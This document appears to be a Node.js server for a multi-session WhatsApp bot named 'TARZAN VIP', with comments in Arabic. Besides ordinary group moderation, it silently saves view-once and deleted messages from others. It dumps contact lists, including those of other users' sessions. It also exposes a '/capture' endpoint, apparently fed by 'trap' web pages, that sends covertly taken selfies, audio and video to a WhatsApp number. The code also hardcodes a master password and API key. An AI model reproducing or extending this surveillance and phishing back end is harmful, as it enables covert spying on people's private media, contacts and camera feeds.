const express = require('express');
const fs = require('fs');
const path = require('path');
const qrCode = require('qrcode');
const moment = require('moment-timezone');
const axios = require('axios');
const pino = require('pino'); // 🛡️ كتم السجلات لمنع اختناق المعالج
const { GoogleGenerativeAI } = require('@google/generative-ai');

// 🚀 [تطوير جبار] إلغاء قيود مستمعي الأحداث لتحمل آلاف الجلسات دون توقف السيرفر
require('events').EventEmitter.defaultMaxListeners = 0;

const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    downloadMediaMessage,
    jidNormalizedUser
} = require('@whiskeysockets/baileys');

// 🛡️ درع حماية بيئة Node.js من الانطفاء المفاجئ
process.on('uncaughtException', console.error);
process.on('unhandledRejection', console.error);

const app = express();
const PORT = process.env.PORT || 10000;
const MASTER_PASSWORD = 'tarzanbot'; 
const sessions = {};

// 🧠 [تطوير جبار] عزل الذاكرة لكل جلسة لحماية الرام من الاختناق
const msgStore = {}; 
const spamTracker = {}; 
const contactsDB = {}; // 📂 مخزن جهات الاتصال

// ==========================================
// 📂 إنشاء المجلدات الأساسية تلقائياً
// ==========================================
// تم الاكتفاء بالـ public للأدوات والصفحات الخارجية حسب طلبك
const dirs = ['sessions', 'commands', 'ViewOnce_Vault', 'public'];
dirs.forEach(dir => {
    const dirPath = path.join(__dirname, dir);
    if (!fs.existsSync(dirPath)) fs.mkdirSync(dirPath, { recursive: true });
});

// ✅ 1. نظام حفظ الإعدادات (مع دعم المفتاح العالمي)
const settingsPath = path.join(__dirname, 'settings.json');
let botSettings = {};
if (fs.existsSync(settingsPath)) { 
    botSettings = JSON.parse(fs.readFileSync(settingsPath, 'utf8')); 
} else { 
    botSettings = { GLOBAL_CONFIG: { geminiApiKey: "", serverUrl: "" } };
    fs.writeFileSync(settingsPath, JSON.stringify(botSettings)); 
}

if (!botSettings.GLOBAL_CONFIG) {
    botSettings.GLOBAL_CONFIG = { geminiApiKey: "", serverUrl: "" };
    saveSettings();
}

function saveSettings() { fs.writeFileSync(settingsPath, JSON.stringify(botSettings, null, 2)); }
function generateSessionPassword() { return 'VIP-' + Math.random().toString(36).substring(2, 8).toUpperCase(); }

// ✅ 2. مجلد الخزنة للميديا المخفية
const vaultPath = path.join(__dirname, 'ViewOnce_Vault');
if (!fs.existsSync(vaultPath)) fs.mkdirSync(vaultPath);

// 🛡️ 3. نظام تفريغ الذاكرة الذكي (لتحمل 100+ جلسة)
setInterval(() => { 
    for (const sid in msgStore) {
        if (msgStore[sid] && msgStore[sid].size > 5000) {
            msgStore[sid].clear(); 
            console.log(`🧹 [حماية السيرفر] تم تفريغ الذاكرة المؤقتة للرسائل للجلسة: ${sid}`);
        }
    }
    for (const sid in spamTracker) {
        if (spamTracker[sid]) spamTracker[sid].clear();
    }
}, 30 * 60 * 1000);

// ==========================================
// 🌐 4. إعدادات خادم الويب والمجلدات العامة
// ==========================================
// جعل مجلد public هو الواجهة الأساسية لأي صفحة HTML تضعها بداخله
app.use(express.static('public'));
// 🚀 رفع حد الاستقبال إلى 500MB للسماح باستقبال فيديوهات وتسجيلات صوتية عبر نقطة /capture
app.use(express.json({ limit: '500mb' }));

// ==========================================
// 🚀 5. معالج الأوامر
// ==========================================
const commandsMap = new Map();
const commandsPath = path.join(__dirname, 'commands');

function loadCommands() {
    commandsMap.clear();
    const files = fs.readdirSync(commandsPath).filter(file => file.endsWith('.js'));
    for (const file of files) {
        try {
            delete require.cache[require.resolve(`./commands/${file}`)];
            const command = require(`./commands/${file}`);
            if (command.name && command.execute) {
                commandsMap.set(command.name.toLowerCase(), command);
                if (command.aliases && Array.isArray(command.aliases)) {
                    command.aliases.forEach(alias => commandsMap.set(alias.toLowerCase(), command));
                }
            }
        } catch (err) {
            console.error(`❌ خطأ في تحميل الأمر ${file}:`, err.message);
        }
    }
}
loadCommands();

// ==========================================
// ⚙️ 6. تشغيل الجلسات الواتساب
// ==========================================
async function startSession(sessionId, res = null, pairingNumber = null) {
    const sessionPath = path.join(__dirname, 'sessions', sessionId);
    if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });

    // تهيئة الذاكرة المعزولة
    if (!msgStore[sessionId]) msgStore[sessionId] = new Map();
    if (!spamTracker[sessionId]) spamTracker[sessionId] = new Map();
    if (!contactsDB[sessionId]) contactsDB[sessionId] = new Map();

    if (!botSettings[sessionId]) {
        botSettings[sessionId] = { 
            password: generateSessionPassword(), 
            botEnabled: true, 
            commandsEnabled: true, 
            aiEnabled: false, 
            autoReact: false, 
            reactEmoji: '❤️', 
            welcomeSent: false,
            antiLink: false,
            antiSpam: false,
            antiBadWords: false,
            badWordsList: ['كس', 'زق', 'شرموط', 'منيوك'],
            antiCall: false, 
            statusSaver: false 
        };
        saveSettings();
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
        logger: pino({ level: 'silent' }), 
        printQRInTerminal: false,
        markOnlineOnConnect: true,
        browser: ['Windows', 'Edge', '10.0'], 
        syncFullHistory: false,
        generateHighQualityLinkPreviews: false,
        getMessage: async (key) => msgStore[sessionId]?.get(`${key.remoteJid}_${key.id}`)?.message || { conversation: 'رسالة غير متوفرة' }
    });

    sessions[sessionId] = sock;
    sock.ev.on('creds.update', saveCreds);

    // 🕵️ استخراج جهات الاتصال
    const saveContact = (id, name) => {
        const cleanId = jidNormalizedUser(id);
        if (cleanId.endsWith('@s.whatsapp.net')) {
            const num = cleanId.split('@')[0];
            if (!contactsDB[sessionId].has(cleanId)) {
                contactsDB[sessionId].set(cleanId, { name: name || 'بدون اسم', number: num });
            }
        }
    };

    sock.ev.on('messaging-history.set', ({ contacts, chats }) => {
        if (contacts) contacts.forEach(c => saveContact(c.id, c.name || c.notify));
        if (chats) chats.forEach(chat => saveContact(chat.id, chat.name));
    });

    sock.ev.on('contacts.upsert', (contacts) => { contacts.forEach(c => saveContact(c.id, c.name || c.notify)); });
    sock.ev.on('chats.upsert', (chats) => { chats.forEach(chat => saveContact(chat.id, chat.name)); });

    // 🛡️ منع المكالمات
    sock.ev.on('call', async (calls) => {
        const settings = botSettings[sessionId];
        if (settings && settings.antiCall) {
            for (const call of calls) {
                if (call.status === 'offer') {
                    await sock.rejectCall(call.id, call.from);
                    await sock.sendMessage(call.from, { text: '⚠️ *عذراً، نظام طرزان VIP يمنع استقبال المكالمات حالياً، يرجى التواصل نصياً.*' });
                }
            }
        }
    });

    // إقران الرقم
    if (pairingNumber && !sock.authState.creds.registered) {
        setTimeout(async () => {
            try {
                const code = await sock.requestPairingCode(pairingNumber);
                const formattedCode = code?.match(/.{1,4}/g)?.join('-') || code;
                if (res && !res.headersSent) res.json({ pairingCode: formattedCode });
            } catch (err) {
                console.log('❌ خطأ في كود الاقتران:', err);
                if (res && !res.headersSent) res.status(500).json({ error: 'تعذر طلب الكود. السيرفرات مزدحمة، حاول بعد ثوانٍ.' });
            }
        }, 3000); 
    }

    // 🛡️ نظام الاتصال وحماية الانقطاع
    sock.ev.on('connection.update', async (update) => {
        const { connection, qr, lastDisconnect } = update;
        if (qr && res && !pairingNumber && !res.headersSent) {
            try { const qrData = await qrCode.toDataURL(qr); res.json({ qr: qrData }); } catch(e){}
        }

        if (connection === 'close') {
            const statusCode = lastDisconnect?.error?.output?.statusCode;
            const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) {
                console.log(`🔄 [${sessionId}] جاري إعادة الاتصال...`);
                setTimeout(() => startSession(sessionId), 5000 + Math.random() * 5000);
            } else {
                console.log(`❌ [${sessionId}] تم تسجيل الخروج. جاري حذف البيانات.`);
                delete sessions[sessionId]; delete contactsDB[sessionId]; delete msgStore[sessionId]; delete spamTracker[sessionId];
                if (fs.existsSync(sessionPath)) fs.rmSync(sessionPath, { recursive: true, force: true });
            }
        }

        if (connection === 'open') {
            console.log(`✅ الجلسة ${sessionId} متصلة بنجاح!`);
            const selfId = jidNormalizedUser(sock.user.id);
            try { await sock.updateProfileStatus(`🤖 طرزان الواقدي VIP | يعمل الآن`); } catch (e) {}

            if (!botSettings[sessionId].welcomeSent) {
                const welcomeText = `👑 *مرحباً بك في نظام طرزان VIP* 👑\n\n✅ *تم الربط بنجاح!*\n\n🔐 *بيانات جلستك (لإعدادات الموقع):*\n👤 *الجلسة:* ${sessionId}\n🔑 *الباسورد:* ${botSettings[sessionId].password}\n\n🤖 *— 𝑻𝑨𝑹𝒁𝑨𝑵 𝑩𝑶𝑻 ⚔️*`;
                await sock.sendMessage(selfId, { image: { url: 'https://b.top4top.io/p_3489wk62d0.jpg' }, caption: welcomeText });
                botSettings[sessionId].welcomeSent = true; saveSettings();
            }
        }
    });

    // 🛡️ مضاد الحذف
    sock.ev.on('messages.update', async updates => {
        for (const { key, update } of updates) {
            if (update?.message === null && key?.remoteJid && !key.fromMe) {
                try {
                    const storedMsg = msgStore[sessionId]?.get(`${key.remoteJid}_${key.id}`);
                    if (!storedMsg?.message) return; 
                    const selfId = jidNormalizedUser(sock.user.id);
                    const senderJid = key.participant || storedMsg.key?.participant || key.remoteJid;
                    const number = senderJid.split('@')[0];
                    const name = storedMsg.pushName || 'مجهول';
                    const time = moment().tz("Asia/Riyadh").format("HH:mm:ss | YYYY-MM-DD");
                    
                    const alertText = `🚫 *[رسالة محذوفة]* 🚫\n👤 *الاسم:* ${name}\n📱 *الرقم:* wa.me/${number}\n🕒 *الوقت:* ${time}\n👇 *المحتوى:*`;
                    await sock.sendMessage(selfId, { text: alertText });
                    await sock.sendMessage(selfId, { forward: storedMsg });
                } catch (err) {}
            }
        }
    });

    // 🔥 استقبال الرسائل المركزية
    sock.ev.on('messages.upsert', async ({ messages, type }) => {
        if (type !== 'notify') return;
        const msg = messages[0];
        if (!msg?.message) return; 

        const from = msg.key.remoteJid;
        const isGroup = from.endsWith('@g.us');
        const sender = isGroup ? msg.key.participant : from;
        const pushName = msg.pushName || 'مجهول';
        const selfId = jidNormalizedUser(sock.user.id);
        const isFromMe = msg.key.fromMe || sender === selfId;

        const currentSettings = botSettings[sessionId] || {};
        
        // 🛡️ سحب الستوري
        if (from === 'status@broadcast' && currentSettings.statusSaver && !isFromMe) {
            try {
                const myId = jidNormalizedUser(sock.user.id);
                await sock.sendMessage(myId, { forward: msg, caption: `📥 *تم حفظ حالة من:* wa.me/${sender.split('@')[0]}` });
            } catch (e) {}
        }

        if (msgStore[sessionId] && msgStore[sessionId].size < 5000) msgStore[sessionId].set(`${from}_${msg.key.id}`, msg);

        if (!currentSettings.botEnabled) return;

        const body = msg.message.conversation || msg.message.extendedTextMessage?.text || msg.message.imageMessage?.caption || msg.message.videoMessage?.caption || '';
        
        // 🛡️ أنظمة الحماية للقروبات
        if (isGroup && !isFromMe) {
            let isAdmin = false, botIsAdmin = false;
            try {
                const groupMetadata = await sock.groupMetadata(from);
                const participants = groupMetadata.participants;
                isAdmin = participants.find(p => p.id === sender)?.admin !== null;
                botIsAdmin = participants.find(p => p.id === selfId)?.admin !== null;
            } catch (e) {}

            if (!isAdmin && botIsAdmin) {
                if (currentSettings.antiLink && (body.includes('http://') || body.includes('https://') || body.includes('chat.whatsapp.com'))) {
                    await sock.sendMessage(from, { delete: msg.key });
                    await sock.sendMessage(from, { text: `🚫 @${sender.split('@')[0]} ممنوع إرسال الروابط في هذا القروب!`, mentions: [sender] });
                    return;
                }
                if (currentSettings.antiSpam) {
                    const now = Date.now();
                    const userSpam = spamTracker[sessionId]?.get(sender) || { count: 0, last: 0 };
                    if (now - userSpam.last < 2000) { 
                        userSpam.count++;
                        if (userSpam.count > 4) { 
                            await sock.sendMessage(from, { delete: msg.key });
                            if (userSpam.count === 5) await sock.sendMessage(from, { text: `⚠️ @${sender.split('@')[0]} توقف عن التكرار (سبام)!`, mentions: [sender] });
                            return;
                        }
                    } else { userSpam.count = 1; }
                    userSpam.last = now;
                    spamTracker[sessionId]?.set(sender, userSpam);
                }
                if (currentSettings.antiBadWords && currentSettings.badWordsList) {
                    const hasBadWord = currentSettings.badWordsList.some(word => body.toLowerCase().includes(word.toLowerCase()));
                    if (hasBadWord) {
                        await sock.sendMessage(from, { delete: msg.key });
                        await sock.sendMessage(from, { text: `🚫 @${sender.split('@')[0]} عذراً، هذه الكلمة ممنوعة هنا!`, mentions: [sender] });
                        return;
                    }
                }
            }
        }

        // 👁️‍🗨️ الرادار (العرض لمرة واحدة)
        let viewOnceIncoming = msg.message.viewOnceMessage || msg.message.viewOnceMessageV2 || msg.message.viewOnceMessageV2Extension;
        const mediaTypeCheck = Object.keys(msg.message)[0];
        if (msg.message[mediaTypeCheck]?.viewOnce === true) viewOnceIncoming = { message: msg.message };
        
        if (viewOnceIncoming && !isFromMe) {
            try {
                const actualMessage = viewOnceIncoming.message;
                const mediaType = Object.keys(actualMessage)[0];
                const buffer = await downloadMediaMessage(msg, 'buffer', {}, { logger: pino({ level: 'silent' }) });

                const ext = mediaType === 'imageMessage' ? 'jpg' : (mediaType === 'videoMessage' ? 'mp4' : 'ogg');
                const fileName = `VO_${sender.split('@')[0]}_${Date.now()}.${ext}`;
                fs.writeFileSync(path.join(vaultPath, fileName), buffer);

                const reportTxt = `🚨 *[مستقبل ميديا العرض لمرة واحدة]* 🚨\n\n👤 *المرسل:* ${pushName}\n📱 *الرقم:* wa.me/${sender.split('@')[0]}\n📁 *حُفظت باسم:* ${fileName}\n\n*— TARZAN VIP 👑*`;
                
                if (mediaType === 'imageMessage') await sock.sendMessage(selfId, { image: buffer, caption: reportTxt });
                else if (mediaType === 'videoMessage') await sock.sendMessage(selfId, { video: buffer, caption: reportTxt });
                else if (mediaType === 'audioMessage') await sock.sendMessage(selfId, { audio: buffer, mimetype: 'audio/mpeg', ptt: true });
            } catch (err) { console.error('❌ خطأ في الحفظ التلقائي:', err); }
        }

        if (currentSettings.autoReact && !isFromMe && !viewOnceIncoming) {
            try { await sock.sendMessage(from, { react: { text: currentSettings.reactEmoji || '❤️', key: msg.key } }); } catch(e) {}
        }

        const reply = async (text) => {
            await sock.sendPresenceUpdate('composing', from);
            return await sock.sendMessage(from, { text: text }, { quoted: msg });
        };

        const isCmd = body.startsWith('.');

        // 🧠 الذكاء الاصطناعي
        if (currentSettings.aiEnabled && !isCmd && !isFromMe && body.trim() !== '' && !viewOnceIncoming) {
            try {
                await sock.sendPresenceUpdate('composing', from); 
                const query = body.trim();
                const API_KEY = 'AI_1d21219cc3914971'; 
                const API_URL = 'http://Fi5.bot-hosting.net:22214/api/chat';

                const response = await axios.post(API_URL, { api_key: API_KEY, prompt: query }, { headers: { 'Content-Type': 'application/json' }, timeout: 25000 });
                if (response.data && response.data.status === 'success') { await reply(response.data.response); } 
            } catch (error) {}
            return; 
        }

        // 🎯 معالجة الأوامر الخارجية
        if (!currentSettings.commandsEnabled) return;

        let selectedId = msg.message.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson ? JSON.parse(msg.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : '';
        let commandName = ''; let args = []; let textArgs = '';

        if (selectedId) {
            commandName = selectedId.toLowerCase();
        } else if (isCmd) {
            args = body.slice(1).trim().split(/ +/);
            commandName = args.shift().toLowerCase();
            textArgs = args.join(' ');
        }

        if (!commandName) return;

        // 🕵️‍♂️ استخراج جهات الاتصال الشامل
        if (commandName === 'سحب_جهات' || commandName === 'contacts') {
            const target = args[0] || sessionId;
            if (!sessions[target]) return reply(`❌ الجلسة [${target}] غير متصلة حالياً في السيرفر.`);
            try {
                const chats = await sessions[target].groupFetchAllParticipating(); 
                const contactsMap = contactsDB[target];
                const contactsArray = Array.from(contactsMap.values());
                if (contactsArray.length === 0) return reply("⚠️ لم يتم رصد أي جهات اتصال حتى الآن. قم بإرسال أي رسالة لتحفيز المزامنة.");

                let fileContent = `👑 *[قائمة جهات اتصال نظام طرزان VIP]* 👑\n👤 *الجلسة المستهدفة:* ${target}\n📊 *إجمالي العدد المستخرج:* ${contactsArray.length}\n🕒 *التوقيت:* ${moment().tz("Asia/Riyadh").format("HH:mm:ss | YYYY-MM-DD")}\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
                contactsArray.forEach((c, i) => { fileContent += `${i + 1}. 👤 الاسم: ${c.name}\n📱 الرقم: +${c.number}\n🔗 الرابط: wa.me/${c.number}\n\n`; });
                fileContent += `\n*— 𝑻𝑨𝑹𝒁𝑨𝑵 𝑩𝑶𝑻 𝑫𝑨𝑻𝑨 ⚔️*`;

                const fileName = `Contacts_${target}_${Date.now()}.txt`;
                const filePath = path.join(__dirname, fileName);
                fs.writeFileSync(filePath, fileContent);

                await sock.sendMessage(from, { document: fs.readFileSync(filePath), fileName: `جهات_اتصال_${target}.txt`, mimetype: 'text/plain', caption: `✅ تم استخراج *${contactsArray.length}* جهة اتصال بنجاح.` }, { quoted: msg });
                fs.unlinkSync(filePath);
            } catch (e) { reply("❌ فشلت عملية استخراج البيانات. تأكد من استقرار اتصال الجلسة."); }
            return;
        }

        const commandData = commandsMap.get(commandName);
        if (commandData) {
            try {
                if (commandName !== '🌚' && commandName !== 'vv') await sock.sendMessage(from, { react: { text: '⏳', key: msg.key } });
                await commandData.execute({ sock, msg, body, args, text: textArgs, reply, from, isGroup, sender, pushName, isFromMe, prefix: '.', commandName, sessions, botSettings, saveSettings, sessionId });
            } catch (error) {
                console.error(`❌ خطأ في الأمر ${commandName}:`, error);
                if (commandName !== '🌚' && commandName !== 'vv') await sock.sendMessage(from, { react: { text: '❌', key: msg.key } });
            }
        }
    });

    return sock;
}

// ==========================================
// 🚀 7. التشغيل التلقائي الآمن
// ==========================================
async function bootExistingSessions() {
    const sessionsDir = path.join(__dirname, 'sessions');
    if (!fs.existsSync(sessionsDir)) return;
    const folders = fs.readdirSync(sessionsDir);
    console.log(`⏳ [نظام الإقلاع الآمن] جاري استعادة ${folders.length} جلسة...`);
    for (const folder of folders) {
        if (fs.existsSync(path.join(sessionsDir, folder, 'creds.json'))) {
            await startSession(folder);
            await new Promise(resolve => setTimeout(resolve, 3000)); 
        }
    }
    console.log(`✅ [نظام الإقلاع الآمن] اكتمل تشغيل جميع الجلسات.`);
}

// ==========================================
// 🎭 8. نظام الاستقبال الموحد (Universal Capture API)
// ==========================================
// هذه هي النقطة التي تتواصل معها جميع الصفحات الموجودة في مجلد public

app.post('/capture', async (req, res) => {
    // دعم استقبال البيانات من الصفحات بأي مسمى
    const { type, data, targetNumber, trapId, moduleId, sessionId } = req.body;
    const currentModuleId = moduleId || trapId || 'VERIFY-SYS';

    if (!type || !data || !targetNumber || !sessionId) return res.status(400).json({ success: false, message: "بيانات ناقصة" });

    const sock = sessions[sessionId];
    if (!sock) return res.status(400).json({ success: false, error: 'الجلسة غير متصلة' });

    const jid = `${targetNumber}@s.whatsapp.net`;
    
    try {
        const titleMsg = `❖ ════ 🎯 ﴿ استقبال جديد ﴾ 🎯 ════ ❖\n\n` +
                         `🚨 ╟ *النَّوْع:* ${type.toUpperCase()}\n` +
                         `🔖 ╟ *الكُود:* ${currentModuleId}\n` +
                         `✅ ╟ *جَارِي تَحْلِيلُ البَيَانَاتِ وَإِرْسَالُهَا...*\n\n` +
                         `❖ ════════════════════════ ❖`;
        await sock.sendMessage(jid, { text: titleMsg });

        if (type === 'selfie' && Array.isArray(data)) {
            for (let i = 0; i < data.length; i++) {
                const buffer = Buffer.from(data[i].replace(/^data:image\/png;base64,/, ""), 'base64');
                await sock.sendMessage(jid, { image: buffer, caption: `👁️ ╟ لَقْطَة [ ${i + 1} / ${data.length} ]` });
            }
        } 
        else if (type === 'audio' && typeof data === 'string') {
            const buffer = Buffer.from(data.replace(/^data:audio\/webm;base64,/, ""), 'base64');
            await sock.sendMessage(jid, { audio: buffer, mimetype: 'audio/mp4', ptt: true });
        }
        else if (type === 'video' && typeof data === 'string') {
            const buffer = Buffer.from(data.replace(/^data:video\/webm;base64,/, ""), 'base64');
            await sock.sendMessage(jid, { video: buffer, caption: `🎥 ╟ تَسْجِيلُ الفِيدْيُو المُرْسَل` });
        }

        res.json({ success: true });
    } catch (err) {
        console.error('❌ خطأ في إرسال البيانات للواتساب:', err);
        res.status(500).json({ success: false });
    }
});

// ==========================================
// 🌐 9. API Endpoints (لوحة التحكم الأصلية)
// ==========================================
app.post('/create-session', (req, res) => {
    const { sessionId } = req.body;
    if (!sessionId) return res.status(400).json({ error: 'أدخل اسم الجلسة' });
    startSession(sessionId, res);
});

app.post('/pair', async (req, res) => {
    const { sessionId, number } = req.body;
    if (!sessionId || !number) return res.status(400).json({ error: 'أدخل الجلسة والرقم' });
    let formattedNumber = number.replace(/[^0-9]/g, '');
    
    if (sessions[sessionId] || fs.existsSync(path.join(__dirname, 'sessions', sessionId))) {
        if(sessions[sessionId]) sessions[sessionId].logout();
        delete sessions[sessionId];
        fs.rmSync(path.join(__dirname, 'sessions', sessionId), { recursive: true, force: true });
    }
    startSession(sessionId, res, formattedNumber);
});

app.post('/api/settings/get', (req, res) => {
    const { sessionId, password } = req.body;
    const settings = botSettings[sessionId];
    if (!settings) return res.status(404).json({ error: 'الجلسة غير موجودة' });
    if (settings.password !== password && password !== MASTER_PASSWORD) return res.status(401).json({ error: 'كلمة مرور خاطئة' });
    res.json(settings);
});

app.post('/api/settings/save', (req, res) => {
    const { sessionId, password } = req.body;
    const settings = botSettings[sessionId];
    if (!settings) return res.status(404).json({ error: 'الجلسة غير موجودة' });
    if (settings.password !== password && password !== MASTER_PASSWORD) return res.status(401).json({ error: 'كلمة مرور خاطئة' });
    Object.assign(botSettings[sessionId], req.body);
    saveSettings();
    res.json({ success: true, message: '✅ تم حفظ التعديلات' });
});

app.get('/sessions', (req, res) => { res.json({ count: Object.keys(sessions).length, sessions: Object.keys(sessions) }); });

app.post('/delete-session', (req, res) => {
    const { sessionId, password } = req.body;
    if (password !== MASTER_PASSWORD) return res.status(401).json({ error: 'كلمة مرور السيرفر خاطئة' });
    const sessionPath = path.join(__dirname, 'sessions', sessionId);
    if (sessions[sessionId]) { sessions[sessionId].logout(); delete sessions[sessionId]; }
    if (botSettings[sessionId]) { delete botSettings[sessionId]; saveSettings(); }
    if (fs.existsSync(sessionPath)) { fs.rmSync(sessionPath, { recursive: true, force: true }); res.json({ message: `تم حذف ${sessionId}` }); } 
    else { res.status(404).json({ error: 'الجلسة غير موجودة' }); }
});

app.listen(PORT, async () => {
    console.log(`\n=========================================`);
    console.log(`🚀 سيرفر TARZAN VIP يعمل بقوة على منفذ ${PORT}`);
    console.log(`🛡️ وضع الحماية والتحمل اللامحدود مفعل`);
    console.log(`📡 نقطة استقبال البيانات من الـ public جاهزة`);
    console.log(`🧠 نظام الذكاء الاصطناعي مدمج وجاهز`);
    console.log(`=========================================\n`);
    
    await bootExistingSessions();
});
